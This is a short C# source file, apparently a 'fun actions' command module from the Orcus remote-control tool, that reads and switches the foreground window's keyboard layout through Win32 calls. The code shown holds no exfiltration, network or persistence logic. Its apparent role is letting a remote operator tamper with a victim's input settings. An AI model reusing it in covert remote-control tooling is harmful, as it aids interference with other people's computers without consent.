using System;
using System.Runtime.InteropServices;
using Orcus.Native;

namespace Orcus.Commands.FunActions;

public class KeyboardLayout
{
	public static ushort GetKeyboardLayout()
	{
		return NativeMethods.GetKeyboardLayout((int)NativeMethods.GetWindowThreadProcessId(NativeMethods.GetForegroundWindow(), IntPtr.Zero));
	}

	public static IntPtr SetKeyboardLayout(string layoutToLoad)
	{
		IntPtr result = NativeMethods.LoadKeyboardLayout(layoutToLoad, 1u);
		NativeMethods.PostMessage(new HandleRef(null, NativeMethods.GetForegroundWindow()), WM.INPUTLANGCHANGEREQUEST, (IntPtr)2, (IntPtr)0);
		return result;
	}

	public static void SwitchTo(uint layoutId)
	{
		if (GetKeyboardLayout() != layoutId)
		{
			string text = layoutId.ToString("X");
			text = "00000000".Substring(text.Length) + text;
			SetKeyboardLayout(text);
		}
	}
}
